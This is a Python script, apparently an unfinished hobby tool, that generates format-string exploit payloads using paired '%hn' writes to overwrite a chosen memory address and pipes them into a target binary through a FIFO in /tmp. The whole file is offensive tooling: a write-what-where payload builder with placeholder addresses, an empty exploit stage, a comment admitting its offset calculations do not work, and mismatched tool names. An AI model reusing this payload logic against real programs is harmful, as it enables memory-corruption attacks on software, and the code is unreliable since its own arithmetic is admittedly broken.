#!/usr/bin/env python3
# coding: utf-8
#
# Made by the Rapace Diabolique
#


from os import access, X_OK, mkfifo
from os.path import realpath, isfile
from argparse import ArgumentParser
from signal import signal, SIGINT
from subprocess import call
from multiprocessing import Process


#
# Version
#
gutenbreg_major = 0
gutenbreg_minor = 1
gutenbreg_bug = 0


#
# Format
#
FMT_CHECK = "x-"
FMT_WRITE = "hn"


#
# Misc
#
FIFO = "/tmp/gutenberg"


def generate_payload(where_to_write, offset, what_to_write, fmt, chr_padd):
    nba2hx = lambda x: ''.join(map(chr, (x & 255, (x >> 8) & 255, (x >> 16) & 255, x >> 24)))
    # thoses calculs doesn't work yet
    pw1 = (what_to_write & ((255 << 8) + 255)) - 37
    _pw = what_to_write >> 16
    pw2 = 65536 * (_pw < pw1) + _pw - pw1 - 37
    print(pw1, pw2)
    payload = "{}{}AAAA%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
                                                                    nba2hx(where_to_write + 2),
                                                                    pw1, offset, fmt,
                                                                    pw2, offset + 1, fmt) + " " * chr_padd
    print(len(payload))
    return payload


def exec_cmd(binary, cmd):
    def _exec():
        call([realpath(binary)], stdin=open(FIFO, 'r'))
        pass
    Process(target=_exec).start()
    print(cmd, file=open(FIFO, 'w'))
    return


def check(binary):
    if not access(binary, X_OK):
        print("[-] Binary can't be executed")
        exit(1)
    pass


def analyze(binary):
    where_to_write = 0xdeadbeef
    offset = 10
    what_to_write = 0xcafebabe
    chr_padd = 0
    payload = generate_payload(where_to_write, offset, what_to_write, FMT_CHECK, chr_padd)

    try:
        if not isfile(realpath(binary)):
            mkfifo(FIFO)
    except OSError as oe:
        print(oe)
        exit(1)

    exec_cmd(binary, payload)
    pass


def exploit(binary):
    pass


def main():
    parser = ArgumentParser(description = "Detect and analyse format string exploit")
    parser.add_argument("binary", metavar="binary", help="The binary to analyse")
    # parser.add_argument("-m", "--method", default="both", choices=["args", "stdin", "both"], help="Use specific method") 
    parser.add_argument("-v", "--version", action="store_true", help="Print version number")
    args = parser.parse_args()

    if (args.version):
        print("[+] Pandemic {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
        print("[+] Made by the Rapace Diabolique\n")

    signal(SIGINT, signal_handler)

    check(args.binary)
    analyze(args.binary)
    exploit(args.binary)


def signal_handler(signal, frame):
    print("[-] Search cancelled")
    exit(0)


if __name__ == '__main__':
    main()
